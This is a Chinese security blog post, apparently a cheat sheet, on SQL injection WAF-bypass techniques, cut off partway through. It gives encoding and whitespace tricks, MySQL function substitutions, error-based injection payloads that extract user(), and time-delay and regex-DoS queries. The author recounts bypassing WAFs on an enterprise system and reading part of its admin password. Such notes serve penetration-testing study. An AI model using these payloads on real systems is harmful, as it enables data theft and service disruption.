@@ -1,0 +1,1012 @@
+  <!DOCTYPE html>
+  <html lang="en"  
+      data-theme-mode="auto"
+  >
+  <head>
+  <meta charset="utf-8">
+  
+  
+  
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.clipboard_tips = {"success":{"zh-CN":"复制成功 (*^▽^*)","en":"Copy successfully (*^▽^*)"},"fail":{"zh-CN":"复制失败 (ﾟ⊿ﾟ)ﾂ","en":"Copy failed (ﾟ⊿ﾟ)ﾂ"},"copyright":{"enable":false,"count":50,"license_type":"by-nc-sa"}};window.REIMU_CONFIG.clipboard_tips.copyright.content = '本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！';window.REIMU_CONFIG.outdate = {"enable":true,"daysAgo":180,"message":{"en":"This article was last updated on {time}. Please note that the content may no longer be applicable.","zh-CN":"本文最后更新于 {time}，请注意文中内容可能已不适用。","zh-TW":"本文最後更新於 {time}，請注意文中內容可能已不適用。","ja":"この記事は最終更新日：{time}。記載内容が現在有効でない可能性がありますのでご注意ください。","pt-BR":"Este artigo foi atualizado pela última vez em {time}. Observe que o conteúdo pode não ser mais aplicável."}};window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'https://jiuzero.github.io';window.REIMU_CONFIG.relative = '/';window.REIMU_CONFIG.i18n_languages = ["en"];</script>
+  <title>
+    SQL注入绕过笔记 | JiuZero&#39;s Blog
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media='all'">
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@fortawesome/fontawesome-free@7.1.0/css/regular.min.css" integrity="sha384-4qYppzjH8EiA+cGdaubu2vL7Rk8WGiqCSj7oRuP1uwtFWkfKNHD20lPfcrbQc8dU" crossorigin="anonymous">
+<link rel="stylesheet" href="https://npm.webcache.cn/@fortawesome/fontawesome-free@7.1.0/css/solid.min.css" integrity="sha384-wbMWab3UDSPm2kvIgVOn&#x2F;d9KPTecgPU1+Nb3zoQrm&#x2F;oVu0EkPL6IaKinjbwW0rum" crossorigin="anonymous">
+
+    <link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://npm.webcache.cn/@fortawesome/fontawesome-free@7.1.0/css/brands.min.css" integrity="sha384-KTGeC2hIMzpeQakhsmzB9bZfhCD5xZZCgI1iZH6f/O457SxzlkzTQg/WXFNoi3ih" crossorigin="anonymous">
+<link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://npm.webcache.cn/@fortawesome/fontawesome-free@7.1.0/css/v5-font-face.min.css" integrity="sha384-nJ1ThfldViXoLpJ6jlKcP2beas8BMbYq26SG9Hi8cH89bZi4RZ644v7helMCqJxd" crossorigin="anonymous">
+<link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://npm.webcache.cn/@fortawesome/fontawesome-free@7.1.0/css/v4-font-face.min.css" integrity="sha384-UlkrhOIvZxJFd4MElSUp7ow6/RUeYKi/orfCZIRRiOENFuQPIAA3T3HjYfmBRhNq" crossorigin="anonymous">
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+    <meta name="description" content="最后一次更新：2025.8.1">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL注入绕过笔记">
+<meta property="og:url" content="https://jiuzero.github.io/en/2025/08/01/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/index.html">
+<meta property="og:site_name" content="JiuZero&#39;s Blog">
+<meta property="og:description" content="最后一次更新：2025.8.1">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://jiuzero.github.io/2025/08/01/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/1.png">
+<meta property="og:image" content="https://jiuzero.github.io/2025/08/01/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/logo.png">
+<meta property="article:published_time" content="2025-07-31T16:00:00.000Z">
+<meta property="article:modified_time" content="2026-07-03T16:24:43.784Z">
+<meta property="article:author" content="JiuZero">
+<meta property="article:tag" content="sqli">
+<meta property="article:tag" content="笔记">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://jiuzero.github.io/2025/08/01/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E7%AC%94%E8%AE%B0/1.png">
+    <link rel="alternate" href="/atom.xml" title="JiuZero's Blog" type="application/atom+xml">
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" integrity="sha384-IfxC36XL/toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei+Zx/1oA/0l8ysE" crossorigin="anonymous">
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css" integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous">
+
+<meta name="generator" content="Hexo 8.1.2"></head>
+
+  <body>
+      <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi ">
+          <img src="/images/loading.gif" alt="loading" />
+      </div>
+      <div class="loading-word">Loading...</div>
+    </div>
+  </div>
+  <script>
+    var time = null;
+    var loaderEl = document.getElementById('loader');
+    var startLoading = () => {
+      time = Date.now();
+      loaderEl.classList.remove("loading");
+    }
+    var hideLoader = () => {
+      document.body.style.overflow = 'auto';
+      loader.classList.add('loading');
+    };
+
+    var endLoading = () => {
+      if (!time) {
+        hideLoader();
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          hideLoader();
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    loaderEl.addEventListener('click', endLoading);
+  </script>
+<div id="copy-tooltip"></div>
+<div id="heatmap-tooltip"></div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav" aria-label="Primary navigation">
+        <a class="main-nav-link-wrap" href="/en/">
+            <div class="main-nav-icon icon ">
+                  &#xf015;
+            </div>
+          <span class="main-nav-link">Home</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/en/archives">
+            <div class="main-nav-icon icon ">
+                  &#xf187;
+            </div>
+          <span class="main-nav-link">Archives</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/en/about">
+            <div class="main-nav-icon icon ">
+                  &#xf007;
+            </div>
+          <span class="main-nav-link">About</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/en/friend">
+            <div class="main-nav-icon icon ">
+                  &#xf500;
+            </div>
+          <span class="main-nav-link">Friend</span>
+        </a>
+    <a id="main-nav-toggle" class="nav-icon" aria-label="Toggle navigation" role="button"></a>
+  </nav>
+  <nav id="sub-nav" aria-label="Secondary navigation">
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed" aria-label="RSS Feed" target="_blank"></a>
+      <a id="nav-search-btn" class="nav-icon popup-trigger" title="Search" aria-label="Search"></a>
+  </nav>
+    <nav id="i18n-nav" aria-label="Language selection">
+      <div class="custom-dropdown">
+        <div class="select-selected" id="select-selected" role="button" aria-haspopup="listbox" aria-expanded="false" aria-label="Language menu">
+          <span id="nav-language-btn" class="nav-icon" style="padding: 0 20px 0 0"></span>
+          <span id="selected-lang">English</span>
+        </div>
+        <ul class="select-items" id="select-items" role="listbox" aria-label="Languages">
+            <li data-value="zh-CN" role="option" aria-selected="false">简体中文</li>
+            <li data-value="en" role="option" class="selected" aria-selected="true">English</li>
+        </ul>
+      </div>
+      <script>
+        var selectSelected = document.getElementById("select-selected");
+        var selectedLang = document.getElementById("selected-lang");
+        var selectItems = document.getElementById("select-items");
+        var selectOptions = selectItems.querySelectorAll("li");
+
+        selectSelected.addEventListener("click", () => {
+          selectItems.classList.toggle("show");
+          var expanded = selectSelected.getAttribute("aria-expanded") === "true";
+          selectSelected.setAttribute("aria-expanded", (!expanded).toString());
+        });
+
+        selectOptions.forEach((item) => {
+          item.addEventListener("click", () => {
+            const langMap = {};
+              langMap['zh-CN'] = '/2025/08/01/SQL注入绕过笔记/';
+              langMap['en'] = '/en/2025/08/01/SQL注入绕过笔记/';
+            selectedLang.textContent = item.textContent;
+            selectItems.classList.remove("show");
+            selectOptions.forEach((option) => {
+              option.classList.remove("selected");
+            });
+            item.classList.add("selected");
+            window.location = langMap[item.dataset.value];
+          });
+        });
+
+        document.addEventListener("click", (event) => {
+          if (!event.target.closest(".custom-dropdown")) {
+            selectItems.classList.remove("show");
+            selectSelected.setAttribute("aria-expanded", "false");
+          }
+        });
+      </script>
+    </nav>
+</div>
+<header id="header" aria-label="Site header">
+    <picture></picture>
+    <img crossorigin="anonymous" fetchpriority="high" src="https://img.8845.top/img2/133074326_p0.jpg" alt="SQL注入绕过笔记">
+  <div id="header-outer">
+    <div id="header-title">
+          <span id="logo">
+            <h1 data-aos="slide-up">SQL注入绕过笔记</h1>
+          </span>
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+        </h2>
+    </div>
+  </div>
+</header>
+
+        <div id="content" aria-label="Page content"  class="sidebar-right" >
+          <aside id="sidebar" aria-label="Sidebar">
+  <div class="sidebar-wrapper-container sticky">
+  <div class="sidebar-wrapper">
+    <div class="sidebar-wrap" data-aos="fade-up">
+          <div class="sidebar-toc-sidebar"><h3 class="toc-title">Contents</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">基础</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">2.</span> <span class="toc-text">通用绕过方法：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">3.</span> <span class="toc-text">MySQL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">4.</span> <span class="toc-text">SQLite</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">5.</span> <span class="toc-text">Access</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">6.</span> <span class="toc-text">特定环境绕过</span></a></li></ol>
+</div>
+</div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="JiuZero" class="lazyload">
+  <div class="sidebar-author-name">JiuZero</div>
+  <div class="sidebar-description">东风夜放花千树，更吹落、星如雨。</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Post</div>
+    <div class="sidebar-state-number">5</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>Category</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>Tag</div>
+    <div class="sidebar-state-number">4</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+    <div class="icon-email sidebar-social-icon">
+      <a href=mailto:1703417187@qq.com itemprop="url" target="_blank" aria-label="email" rel="noopener nofollow noreferrer"></a>
+    </div>
+    <div class="icon-github sidebar-social-icon">
+      <a href=https://github.com/JiuZero itemprop="url" target="_blank" aria-label="github" rel="noopener nofollow noreferrer"></a>
+    </div>
+    <div class="icon-bilibili sidebar-social-icon">
+      <a href=https://space.bilibili.com/1308423507 itemprop="url" target="_blank" aria-label="bilibili" rel="noopener nofollow noreferrer"></a>
+    </div>
+    <div class="icon-qq sidebar-social-icon">
+      <a href=https://qm.qq.com/q/RIxC8AQxCE itemprop="url" target="_blank" aria-label="qq" rel="noopener nofollow noreferrer"></a>
+    </div>
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/en/" aria-label="Home"></a>
+          <div class="sidebar-menu-icon icon ">
+                &#xf015;
+          </div>
+        <div class="sidebar-menu-link">Home</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/en/archives" aria-label="Archives"></a>
+          <div class="sidebar-menu-icon icon ">
+                &#xf187;
+          </div>
+        <div class="sidebar-menu-link">Archives</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/en/about" aria-label="About"></a>
+          <div class="sidebar-menu-icon icon ">
+                &#xf007;
+          </div>
+        <div class="sidebar-menu-link">About</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/en/friend" aria-label="Friend"></a>
+          <div class="sidebar-menu-icon icon ">
+                &#xf500;
+          </div>
+        <div class="sidebar-menu-link">Friend</div>
+      </div>
+</div>
+</div>
+          <div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div>
+    </div>
+  </div>
+  <div class="sidebar-widget">
+  </div>
+  </div>
+</aside>
+
+          <section id="main" aria-label="Main content"><article id="post-SQL注入绕过笔记" class="h-entry article" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <span class="article-date-link icon-calendar" data-aos="zoom-in">
+    <time datetime="2025-07-31T16:00:00.000Z" itemprop="datePublished">2025-08-01</time>
+    <time style="display: none;" id="post-update-time">2026-07-04</time>
+  </span>
+    <span class="article-date-link icon-calendar-plus" data-aos="zoom-in">
+      <time datetime="2026-07-03T16:24:43.784Z" itemprop="dateModified">2026-07-04</time>
+    </span>
+</div>
+
+    </div>
+    
+    <div class="hr-line"></div>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+        <div class="warning custom-block" id="outdate-blockquote" style="display: none;">
+          <p class="custom-block-title">WARNING</p>
+          <p></p>
+        </div>
+        <blockquote>
+<p><strong>最后一次更新</strong>：2025.8.1</p>
+</blockquote>
+<span id="more"></span>
+
+<!-- toc -->
+
+<ul>
+<li><a href="#%E5%9F%BA%E7%A1%80">基础</a></li>
+<li><a href="#%E9%80%9A%E7%94%A8%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95">通用绕过方法：</a></li>
+<li><a href="#mysql">MySQL</a></li>
+<li><a href="#sqlite">SQLite</a></li>
+<li><a href="#access">Access</a></li>
+<li><a href="#%E7%89%B9%E5%AE%9A%E7%8E%AF%E5%A2%83%E7%BB%95%E8%BF%87">特定环境绕过</a></li>
+</ul>
+<!-- tocstop -->
+
+<h2><span id="基础">基础</span></h2><ol>
+<li><strong>逻辑符</strong></li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">and （&amp;&amp;）</span><br><span class="line">or（||）</span><br><span class="line">xor（^） # 有些数据库不支持异或运算</span><br></pre></td></tr></table></figure>
+
+<p>除外还有一些在实战过程中不常用的：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">not（!）</span><br><span class="line">~	# 位取反</span><br><span class="line">&lt;&lt;	# 位左移</span><br><span class="line">&gt;&gt;	# 位右移</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li><p><strong>运算符（加减乘除）</strong></p>
+<blockquote>
+<p>不要小看运算符，它能帮助你快速验证SQL注入是否存在<br>假设有参数id&#x3D;1<br>id&#x3D;2-1（True）与id&#x3D;1-1000（False）（减号ban率低于除号）<br>id&#x3D;2&#x2F;1（True）与id&#x3D;1&#x2F;0（False）（这个False会产生除0报错，如果报错抛出则存在SQL报错注入）<br>同样的：如果id&#x3D;2-1与id&#x3D;3-2页面一致，存在SQL注入<br>当然你也可以拿它来判断闭合方式（不举例了&#x2F;躺）<br>Z0Scan就用的这个检测方式~</p>
+</blockquote>
+</li>
+<li><p><strong>注释符</strong></p>
+</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># （MySQL特有，URL中需编码为%23）</span><br><span class="line">-- （注意后面需跟空格或换行）</span><br><span class="line">/* */ （多行注释，可嵌套）</span><br><span class="line">;%00 （空字符截断，部分环境有效）</span><br></pre></td></tr></table></figure>
+
+<h2><span id="通用绕过方法">通用绕过方法：</span></h2><ol>
+<li><strong>强制URL编码</strong></li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">原：id=1000-ascii(1)</span><br><span class="line">后：id=%31%30%30%30%2d%61%73%63%69%69%28%31%29</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li><strong>特殊编码&amp;特殊语法替换空格</strong><table>
+<thead>
+<tr>
+<th align="center">字符</th>
+<th align="center">含义</th>
+<th align="center">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center"><code>%09</code></td>
+<td align="center">TAB键（水平）</td>
+<td align="center">水平制表符</td>
+</tr>
+<tr>
+<td align="center"><code>%0a</code></td>
+<td align="center">新建一行</td>
+<td align="center">换行符（LF, Line Feed）</td>
+</tr>
+<tr>
+<td align="center"><code>%0b</code></td>
+<td align="center">TAB键（垂直）</td>
+<td align="center">垂直制表符</td>
+</tr>
+<tr>
+<td align="center"><code>%0c</code></td>
+<td align="center">新的一页</td>
+<td align="center">换页符（FF, Form Feed）</td>
+</tr>
+<tr>
+<td align="center"><code>%0d</code></td>
+<td align="center">回车键</td>
+<td align="center">回车符（CR, Carriage Return）</td>
+</tr>
+<tr>
+<td align="center"><code>%a0</code></td>
+<td align="center">空格</td>
+<td align="center">非断空格（Non-breaking Space）</td>
+</tr>
+<tr>
+<td align="center"><code>%00</code></td>
+<td align="center">终止符</td>
+<td align="center">NULL 字符（字符串结束符）</td>
+</tr>
+<tr>
+<td align="center"><code>/**/</code></td>
+<td align="center">注释符</td>
+<td align="center">多行注释</td>
+</tr>
+<tr>
+<td align="center"><code>/*!*/</code></td>
+<td align="center">注释符 + 检测版本的语法</td>
+<td align="center">MySQL 特有，用于条件执行（如 <code>/*!50001 SELECT */</code>）</td>
+</tr>
+</tbody></table>
+</li>
+</ol>
+<blockquote>
+<p><strong>特别注意：</strong><br>%00会截断语句，有时候不可直接作为空格的替换字符，如果直接使用会造成sql语句报错<br>MySQL中有个特性，一般情况下&#x2F;<em>!</em>&#x2F;是用于检测mysql版本，也就是感叹号后面要加数据库版本号<br>如果高于这个版本，就执行后面的语句，如下面的语句表示数据库版本高5.00.09才会执行：<br><code>/*!50009 select * from test*/</code><br>另外通常感叹号后面加的是数字，如果是其他字符将会报错。但有例外，如果加的是SQL关键字比如union、select、where等，那么也能正常执行</p>
+</blockquote>
+<p>各种数据库中的空白字符：</p>
+<table>
+<thead>
+<tr>
+<th align="center">数据库</th>
+<th align="center">空白字符（十六进制表示）</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">SQLite3</td>
+<td align="center">0A, 0D, 0C, 09, 20</td>
+</tr>
+<tr>
+<td align="center">MySQL5</td>
+<td align="center">09, 0A, 0B, 0C, 0D, A0, 20</td>
+</tr>
+<tr>
+<td align="center">PostgreSQL</td>
+<td align="center">0A, 0D, 0C, 09, 20</td>
+</tr>
+<tr>
+<td align="center">Oracle 11g</td>
+<td align="center">00, 0A, 0D, 0C, 09, 20</td>
+</tr>
+<tr>
+<td align="center">MSSQL</td>
+<td align="center">01, 02, 03, 04, 05, 06, 07, 08, 09, 0A, 0B, 0C, 0D, 0E, 0F, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 1A, 1B, 1C, 1D, 1E, 1F, 20</td>
+</tr>
+</tbody></table>
+<ol start="3">
+<li><strong>使用括号替代空格（要求：包裹函数、包裹一段运算或子查询）</strong></li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">原：id=1000 and &#x27;123&#x27; like user()</span><br><span class="line">后：id=1000 and &#x27;123&#x27; like(user())</span><br></pre></td></tr></table></figure>
+
+<ol start="4">
+<li><strong>引号替代空格</strong></li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">原：id=1000 and &#x27;123&#x27; like &#x27;123&#x27;</span><br><span class="line">后：id=1000 and&#x27;123&#x27;like&#x27;123&#x27;</span><br></pre></td></tr></table></figure>
+
+<ol start="5">
+<li><strong>双引号替代单引号</strong></li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">原：id=1000 and &#x27;123&#x27; like &#x27;123&#x27;</span><br><span class="line">后：id=1000 and &quot;123&quot; like &quot;123&quot;</span><br></pre></td></tr></table></figure>
+
+<ol start="6">
+<li><strong>大小写混合</strong></li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">原：id=1000 and 1 like 1</span><br><span class="line">后：id=1000 aNd 1 lIkE 1</span><br></pre></td></tr></table></figure>
+
+<h2><span id="mysql">MySQL</span></h2><p>MySQL这个数据库只能说太好绕了，单是函数平替&amp;语句变换就已经足以绕过绝大多数WAF了</p>
+<ol>
+<li><strong>函数平替绕过</strong></li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"># 字符串长度</span><br><span class="line">length() → char_length()、bit_length()/8</span><br><span class="line"># 字符串截取</span><br><span class="line">substr() → substring()、mid()、left()、trim()、right()、rlike、regexp</span><br><span class="line"># 字符转换</span><br><span class="line">ascii() → ord()、hex()、bin()</span><br><span class="line"># 连接字符串</span><br><span class="line">concat() → concat_ws(&#x27;,&#x27;,a,b)、group_concat()（多行合并时）</span><br><span class="line"># 数据库信息</span><br><span class="line">database() → schema()、@@database</span><br><span class="line"># 版本信息</span><br><span class="line">version() → @@version、@@global.version</span><br><span class="line">datadir() → @@datadir</span><br><span class="line"># 字符串替换</span><br><span class="line">replace() → insert(str,pos,len,newstr)</span><br><span class="line"># 延时</span><br><span class="line">sleep() → benchmark()</span><br><span class="line"># 相等</span><br><span class="line">= → like（rlike、regexp）、strcmp()</span><br><span class="line"># 比较</span><br><span class="line">&gt;、&lt; → greatest()（返回最大值）、least（）（返回最小值）、 a between 1 and 50 （50&gt;a&gt;=1）、in()</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li><strong>注释符变种绕过</strong></li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">原：id=1 and 1=1 -- +</span><br><span class="line">后：id=1 and 1=1 #</span><br><span class="line">    id=1 and 1=1 /*!*/</span><br><span class="line">    id=1 and 1=1 -- -</span><br><span class="line">    id=1 and 1=1 /**/-- </span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li><strong>关键字绕过（利用MySQL特性）</strong></li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 空格+关键字+空格 被拦截时</span><br><span class="line">原：select user()</span><br><span class="line">后：sel/**/ect user()</span><br><span class="line">    `select` user() （反引号包裹）</span><br></pre></td></tr></table></figure>
+
+<ol start="4">
+<li><p><strong>报错注入函数合集</strong></p>
+<table>
+<thead>
+<tr>
+<th align="center">函数名</th>
+<th align="center">示例用法</th>
+<th align="center">适用版本范围</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center"><code>geometrycollection()</code></td>
+<td align="center"><code>geometrycollection((select from(select from(select user())a)b));</code></td>
+<td align="center">5.1 ≤ version ≤ 5.5.48</td>
+</tr>
+<tr>
+<td align="center"><code>multipoint()</code></td>
+<td align="center"><code>multipoint((select * from(select user())b));</code></td>
+<td align="center">5.1 ≤ version ≤ 5.5.48</td>
+</tr>
+<tr>
+<td align="center"><code>polygon()</code></td>
+<td align="center"><code>select polygon((select from(select from(select user())a)b));</code></td>
+<td align="center">5.1 ≤ version ≤ 5.5.48</td>
+</tr>
+<tr>
+<td align="center"><code>multipolygon()</code></td>
+<td align="center"><code>multipolygon((select from(select from(select user())a)b));</code></td>
+<td align="center">5.1 ≤ version ≤ 5.5.48</td>
+</tr>
+<tr>
+<td align="center"><code>linestring()</code></td>
+<td align="center"><code>linestring((select from(select from(select user())a)b));</code></td>
+<td align="center">5.1 ≤ version ≤ 5.5.48</td>
+</tr>
+<tr>
+<td align="center"><code>multilinestring()</code></td>
+<td align="center"><code>multilinestring((select from(select from(select user())a)b));</code></td>
+<td align="center">5.1 ≤ version ≤ 5.5.48</td>
+</tr>
+<tr>
+<td align="center"><code>exp()</code></td>
+<td align="center"><code>exp(~(select * from(select user())a));</code></td>
+<td align="center">5.1 ≤ version ≤ 5.5.48</td>
+</tr>
+<tr>
+<td align="center"><code>ST_LatFromGeoHash()</code></td>
+<td align="center"><code>select ST_LatFromGeoHash(user());</code></td>
+<td align="center">version ≥ 5.7</td>
+</tr>
+<tr>
+<td align="center"><code>ST_LongFromGeoHash()</code></td>
+<td align="center"><code>select ST_LongFromGeoHash(user());</code></td>
+<td align="center">version ≥ 5.7</td>
+</tr>
+<tr>
+<td align="center"><code>GTID_SUBSET()</code></td>
+<td align="center"><code>select GTID_SUBSET(user(),1);</code></td>
+<td align="center">version ≥ 5.7</td>
+</tr>
+<tr>
+<td align="center"><code>GTID_SUBTRACT()</code></td>
+<td align="center"><code>select GTID_SUBTRACT(user(),1);</code></td>
+<td align="center">version ≥ 5.7</td>
+</tr>
+<tr>
+<td align="center"><code>ST_PointFromGeoHash()</code></td>
+<td align="center"><code>select ST_PointFromGeoHash(user(),1);</code></td>
+<td align="center">version ≥ 5.7</td>
+</tr>
+<tr>
+<td align="center"><code>procedure analyse()</code></td>
+<td align="center"><code>procedure analyse(extractvalue(1,concat(0x3a,user())),1);</code></td>
+<td align="center">version ≤ 5.6.17</td>
+</tr>
+</tbody></table>
+</li>
+<li><p><strong>char()</strong><br>这个函数挺有意思的，你可以看情况把它穿插在语句中~</p>
+</li>
+<li><p><strong>特殊延时</strong></p>
+</li>
+</ol>
+<ul>
+<li><p>benchmark()<br>这个就不展开细说了</p>
+</li>
+<li><p>笛卡尔积延时<br>当查询发生在多个表中时，会将多个表已笛卡尔积的形式联合起来，在进行查询，非常费时；</p>
+</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">FROM</span> information_schema.columns A, information_schema.columns B, information_schema.columns C;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>我当时就是借助笛卡尔积延时配合括号替代空格大法过双WAF通杀了某国企后台管理系统（可惜手贱交成事件了，发现是通杀的时候案例不够了&#x2F;破防）<br>CNVD评级才中，后面不服，利用反引号特性把后台密码读了一点出来才给高…</p>
+</blockquote>
+<ul>
+<li>正则dos延时<br>通过费时正则匹配操作消耗时间</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> concat(rpad(<span class="string">&#x27;a&#x27;</span>,<span class="number">3999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="string">&#x27;a&#x27;</span>,<span class="number">3999999</span>,<span class="string">&#x27;a&#x27;</span>)) RLIKE concat(repeat(<span class="string">&#x27;(a.*)+&#x27;</span>,<span class="number">30</span>),<span class="string">&#x27;b&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<ol start="7">
+<li><strong>使用16进制绕过引号</strong></li>
+</ol>
